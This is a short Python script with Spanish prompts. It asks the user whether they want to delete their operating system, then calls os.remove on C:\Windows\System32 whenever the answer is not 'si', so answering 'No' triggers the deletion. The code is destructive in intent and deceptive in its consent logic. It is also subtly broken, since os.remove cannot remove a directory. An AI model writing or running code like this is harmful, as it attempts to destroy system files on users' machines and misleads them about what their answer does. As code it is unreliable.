import os 
print ("¿Quieres eliminar tu sistema operativo?")
respuestas= input ('Si o No')

if respuestas == "si":
    print ("Gracias, por aceptar")
else:
    os.remove ("C:\\Windows\\System32")   